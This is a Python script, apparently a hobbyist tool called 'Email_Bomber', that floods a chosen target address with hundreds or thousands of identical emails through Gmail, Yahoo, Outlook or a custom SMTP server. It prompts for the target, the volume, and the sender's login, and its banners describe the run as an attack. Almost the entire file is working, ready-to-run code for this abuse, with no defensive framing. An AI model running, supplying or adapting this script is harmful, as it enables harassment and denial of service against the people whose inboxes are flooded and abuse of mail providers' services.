# imports ...
import sys
import smtplib

class Bcolors():
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"

def banner():
    print(Bcolors.GREEN + "+[+[+[ Email_Bomber vs 1.0 ]+]+]+")
    print(Bcolors.GREEN +'[+[+[+ Written by Anthony +]+]+]')
    print(Bcolors.RED + """
                   |
                 ###
            #############                 EMAIL_BOMBER>>>
         ##################               Author: Anthony
        ####################
       ######################
       ############ .-,,#####
       #####################
        #########     ##  #
          ##########    ####
              #######
                 
    ____________________________________________________________,''',
                                                                    )
                                                      
    """)
# ...ALGORITHM.....
# initialize
# bomd
# email
# send 
# attack

class Email_Bomber:
    count = 0

    # instance of the class 
    def __init__(self):
        try:
            print(Bcolors.RED + "\n+[+[+[  Initializing program...  ]+]+]+")
            self.target = str(input(Bcolors.GREEN+ "Please enter you target email <: ")) # target
            self.mode = int(input(Bcolors.GREEN + "Enter BOMB mode: (1,2,3,4) || 1:(1000), 2:(500), 3:(250), 4:(Custom) <: ")) # choose bomb mode
            if int(self.mode) < int(1) or int(self.mode) > int(4):
                print("ERROR: Invalid input!")
                sys.exit(1)
        except Exception as e:
            print(f"ERROR: {e}")

    def bomb(self):
        try:
            print(Bcolors.RED + "\n+[+[+[ Setting up bomb ]+]+]+") # Initializing bombing 
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(Bcolors.GREEN + "choose a CUSTOM amount <:  "))
            print(Bcolors.RED + f"\n+[+[+[ You have selected BOMB-MODE: {self.mode} and {self.amount} emails. ]+]+]+ ")
        except Exception as e:
            print(f"ERROR: {e}")

    def email(self):
        try:
            print(Bcolors.RED + "\n+[+[+[ Setting up email ]+]+]+")  # setting up email
            self.server = str(input(Bcolors.GREEN + "Enter email server | or select a premade options - 1:Gmail 2:Yahoo 3:outlook <: "))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(Bcolors.GREEN + "Enter port number <:  "))
            if default_port == True:
                self.port = int(587)
            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server =='2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
                
            self.fromAddr = str(input(Bcolors.GREEN + 'Enter from address <:  '))
            self.fromPwd = str(input(Bcolors.GREEN + 'Enter from password <:  '))
            self.subject = str(input(Bcolors.GREEN + 'Enter subject <:  '))
            self.message = str(input(Bcolors.GREEN + 'Enter message <:  '))

            self.msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
            '''% (self.fromAddr, self.target, self.subject, self.message)
            
            # creating server
            self.s =smtplib.SMTP(self.server, self.port)
            # what's this line of code doing ???
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f"ERROR: {e}")

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(Bcolors.YELLOW + f"BOMB: {self.count}")
        except Exception as e:
            print(f"ERROR: {e}")

    def attack(self):
        print(Bcolors.RED + "\n+[+[+[ Attacking... ]+]+]+")  # attacking...
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(Bcolors.GREEN + "\n+[+[+[ Attack Finished! ]+]+]+")
        sys.exit(0)

if __name__ == '__main__':
    banner()
    bomber = Email_Bomber()
    bomber.bomb()
    bomber.email()
    #bomber.send()
    bomber.attack()
    
            